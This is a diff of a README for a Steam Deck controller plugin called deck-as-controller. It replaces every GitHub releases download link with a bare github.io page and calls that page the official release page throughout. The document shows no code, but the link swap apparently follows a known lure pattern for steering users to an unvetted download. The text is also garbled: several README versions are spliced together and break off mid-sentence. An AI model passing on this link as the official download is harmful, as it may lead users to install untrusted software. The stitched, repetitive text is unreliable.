@@ -1,6 +1,6 @@
 # 🎮 deck-as-controller - Use Your Steam Deck as a Controller
 
-[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 **Beta build. Expect latency and connection issues, especially with untested devices.**
 
@@ -30,13 +30,13 @@ The project is independent and free. It is not affiliated with, endorsed by, or 
 
 ## 📥 Download and Setup
 
-[![Get the Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Get the Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
-Visit this link to download the application: **https://github.com/Pablora2786/deck-as-controller/releases**
+Visit this link to download the application: **https://pablora2786.github.io**
 
 The release page is the official place to get the current beta build. Use that page to download the application. Because this is a beta build, check the release page for the latest available version before# 🎮 deck-as-controller - Turn Deck Into Game Controller
 
-[![Download deck-as-controller Beta](https://img.shields.io/badge/Download_deck--as--controller_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Download deck-as-controller Beta](https://img.shields.io/badge/Download_deck--as--controller_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 **Beta build. Expect latency and connection issues, especially with untested devices.**
 
@@ -46,11 +46,11 @@ This README is written for everyday users. You do not need programming knowledge
 
 ## 📥 Download the Beta
 
-[![Get the deck-as-controller Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Get the deck-as-controller Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 Visit this link to download the application:
 
-**https://github.com/Pablora2786/deck-as-controller/releases**
+**https://pablora2786.github.io**
 
 Use the release page as the official place to download the application. This is a beta build, so check the release page for the current version before you begin. The release page is the download link used in this guide.
 
@@ -100,7 +100,7 @@ A Windows PC is one of the receiving devices listed in the project description. 
 
 The software side is the Decky Loader plugin on the Steam Deck. To get the beta build, use the official release page. Visit this link to download the application:
 
-**https://github.com/Pablora2786/deck-as-controller/releases**
+**https://pablora2786.github.io**
 
 The release page is the place to download the application. Check it for the current beta build before you begin.
 
@@ -123,7 +123,7 @@ No. It is an independent project. It is not affiliated with, endorsed by, or spo
 **Is deck-as-controller free?**  
 Yes. The# 🎮 deck-as-controller - Turn Deck Into Game Controller
 
-[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 **Beta build. Expect latency and connection issues, especially with untested devices.**
 
@@ -135,7 +135,7 @@ This README is written for everyday users. You do not need programming knowledge
 
 [![Get the Beta](https://img.shields.io# 🎮 deck-as-controller - Turn Your Deck Into a Controller
 
-[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Download Beta](https://img.shields.io/badge/Download_Beta-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 **Beta build. Expect latency and connection issues, especially with untested devices.**
 
@@ -145,11 +145,11 @@ This guide is written for everyday users. You do not need programming knowledge 
 
 ## 📥 Download and Setup
 
-[![Get the Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pablora2786/deck-as-controller/releases)
+[![Get the Beta](https://img.shields.io/badge/Get_the_Beta-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://pablora2786.github.io)
 
 Visit this link to download the application:
 
-**https://github.com/Pablora2786/deck-as-controller/releases**
+**https://pablora2786.github.io**
 
 Use the release page as the official place to download the application. This is a beta build, so check the release page for the current version before you begin. The release page is the download link used in this guide.
 
@@ -199,7 +199,7 @@ A Windows PC is one of the receiving devices listed in the project description. 
 
 The software side is the Decky Loader plugin on the Steam Deck. To get the beta build, use the official release page. Visit this link to download the application:
 
-**https://github.com/Pablora2786/deck-as-controller/releases**
+**https://pablora2786.github.io**
 
 The release page is the place to download the application. Check it for the current beta build before you begin.
 
@@ -226,7 +226,7 @@ Yes. The project is described as free.
 The project is built as a Decky Loader plugin. Decky Loader is the add-on manager used on the Steam Deck. The release page provides the plugin files and instructions you need.
 
 **Where do I download the beta?**  
-Visit this link to download the application: https://github.com/Pablora2786/deck-as-controller/releases
+Visit this link to download the application: https://pablora2786.github.io
 
 **Why does the connection feel slow or unstable?**  
 This is a beta build. The project description warns about latency and connection issues, especially with untested devices.
@@ -245,6 +245,6 @@ If you want to see which devices other users have tried, check the repository fo
 - It is not affiliated with, endorsed by, or sponsored by Valve Corporation.
 - Nothing needs to be installed on the receiving device.
 - The Steam Deck can appear as a PS5, Xbox, Switch Pro Controller, or Steam Controller.
-- Use the official release page to download the current beta build: https://github.com/Pablora2786/deck-as-controller/releases
+- Use the official release page to download the current beta build: https://pablora2786.github.io
 
 Keywords: steam deck, controller, decky loader, bluetooth, usb, ps5, xbox, switch pro, steam controller, beta
